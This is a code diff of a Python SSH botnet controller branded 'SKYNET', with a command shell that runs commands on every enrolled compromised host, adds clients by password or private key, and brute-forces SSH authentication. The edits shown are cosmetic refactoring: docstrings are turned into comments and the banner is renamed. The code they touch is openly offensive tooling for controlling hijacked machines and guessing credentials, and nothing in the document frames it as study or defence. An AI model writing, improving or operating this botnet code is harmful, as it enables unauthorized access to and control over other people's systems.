@@ -13,7 +13,7 @@ class BotNet(cmd.Cmd):
     undoc_header = None
     doc_header = 'Commands (type help <command>):'
     prompt = '(SKYNET) '
-    intro = """
+    banner = """
                                           :s:
                                         /dNMNh:
                                       /dNMMMMMNh:
@@ -40,9 +40,9 @@ class BotNet(cmd.Cmd):
                    ╚════██║██╔═██╗   ╚██╔╝  ██║╚██╗██║██╔══╝     ██║   
                    ███████║██║  ██╗   ██║   ██║ ╚████║███████╗   ██║   
                    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   
-                   
+
                          Neural-Net based Artificial Intelligence
-                                                    
+
     """
 
     def print_topics(self, header, cmds, cmdlen, maxcol):
@@ -58,21 +58,15 @@ class BotNet(cmd.Cmd):
                 print("\nExiting...\n")
                 exit(0)
 
+    # execute botnet command
     def do_exec_command(self, command):
-        """
-        exec_command [uname -a]
-        execute botnet command
-        """
         for client in botnet:
             output = client.send_command(command)
             print('[*] Output from ' + client.host)
             print('[+] ' + output.decode())
 
+    # add a client to the botnet
     def do_add_client(self, args):
-        """
-        add_client [host user password/key]
-        Add a client to the botnet
-        """
         h, u, p = args.split(" ")
         secret_key = self.load_keyfile(p)
         if secret_key:
@@ -85,9 +79,9 @@ class BotNet(cmd.Cmd):
             botnet.append(c)
             print("[+] CLIENT ADDED:", c.host)
 
+    # if keyfile isn't one of these 3 types...
+    # it will be treated as a plaintext password
     def load_keyfile(self, keyfile):
-        # if keyfile isn't one of these 3 types it
-        # will be treated as a plaintext password
         for cls in (paramiko.RSAKey, paramiko.DSSKey, paramiko.ECDSAKey):
             try:
                 return cls.from_private_key_file(keyfile)
@@ -96,11 +90,8 @@ class BotNet(cmd.Cmd):
         else:
             return None
 
+    # brute force authentication
     def do_brute_force(self, args):
-        """
-        brute_force [host user password/key]
-        brute force authentication
-        """
         h, u, k = args.split(" ")
         if os.path.isdir(k):
             for keyfile in k:
@@ -147,15 +138,16 @@ class Client:
             # todo logging e
             print('[-] CONNECTION FAILED:', self.host)
 
-    def send_command(self, cmd):
-        stdin, stdout, stderr = self.session.exec_command(cmd)
+    def send_command(self, send_cmd):
+        stdin, stdout, stderr = self.session.exec_command(send_cmd)
         return stdout.read()
 
     @timeout_decorator.timeout(2, use_signals=False)
     def host_check(self, host):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect_ex((host, 22)) == 0
+        s.connect_ex((host, 22))
 
 
 if __name__ == '__main__':
+    print(BotNet.banner)
     BotNet().cmdloop()
